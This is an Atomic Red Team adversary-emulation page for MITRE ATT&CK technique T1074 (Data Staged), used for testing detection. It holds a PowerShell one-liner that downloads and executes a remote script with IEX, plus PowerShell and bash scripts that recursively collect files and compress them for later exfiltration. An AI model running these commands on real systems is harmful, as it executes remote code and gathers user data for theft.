# T1074 - Data Staged
## [Description from ATT&CK](https://attack.mitre.org/wiki/Technique/T1074)
<blockquote>Collected data is staged in a central location or directory prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as Data Compressed or Data Encrypted.

Interactive command shells may be used, and common functionality within cmd and bash may be used to copy data into a staging location.

Detection: Processes that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files.

Monitor processes and command-line arguments for actions that could be taken to collect and combine files. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as Windows Management Instrumentation and PowerShell.

Platforms: Linux, macOS, Windows

Data Sources: File monitoring, Process monitoring, Process command-line parameters</blockquote>

## Atomic Tests

- [Atomic Test #1 - Stage data from Discovery.bat](#atomic-test-1---stage-data-from-discoverybat)
- [Atomic Test #2 - Collect all files extensions and stage within a compressed directory](#atomic-test-1---compress-all-file-types)


<br/>

## Atomic Test #1 - Stage data from Discovery.bat
Utilize powershell to download discovery.bat and save to a local file

**Supported Platforms:** Windows


#### Run it with `powershell`!
```
powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/Discovery.bat')" > c:\windows\pi.log
```
<br/>
<hr/>
<br/>

## Atomic Test #2 - Collect and Compress all file types
Collect all specified file extensions recursively from a specified file path on the target machine. All located files are copied into a temporary location before being compressed.

**Supported Platforms:**
- Windows
- Linux


#### Run it with `powershell`!
Note:
- ```{{ path }}```: requires a default path to start recursive search from
- ```{{ extension }}```: requires a file extension to search for

```
$FolderPath = '{{ path }}'
$FileExtension = '{{ extension }}'

New-Item -ItemType directory -Path C:\temp\staging

function TestPath()  
{ 
    $FileExists = Test-Path $FolderPath 
    If ($FileExists -eq $True)  
    { 
        Return $true 
    } 
    Else  
    { 
        Return $false 
    } 
}

function ZipFiles()
{
   Add-Type -Assembly System.IO.Compression.FileSystem
   $compressionLevel = [System.IO.Compression.CompressionLevel]::Optimal
   [System.IO.Compression.ZipFile]::CreateFromDirectory("C:\temp\staging",
        "C:\temp\staging.zip", $compressionLevel, $false)
}
 
$Result = (TestPath($FolderPath)); 
 
If ($Result) 
{ 
    $Dir = get-childitem $FolderPath -Recurse -ErrorAction Ignore 
    $List = $Dir | where {$_.extension -eq $FileExtension} 
    $List | Copy-Item -Destination C:\temp\staging\ -ErrorAction Ignore
} 
else 
{ 
    "Folder path is incorrect." 
}

ZipFiles

Remove-Item -Recurse -Force C:\temp\staging

```

#### Run it with `bash`!
Note:
- ```{{ path }}```: requires a default path to start recursive search from
- ```{{ extension }}```: requires a file extension to search for

```
mkdir -p /tmp/staging
find {{ path }} -name '*{{ extension }}' -exec cp -prv '{}' '/tmp/staging' ';'
tar -zcvf /tmp/staging.tar.gz /tmp/staging/
rm -rf /tmp/staging
```
<br/>
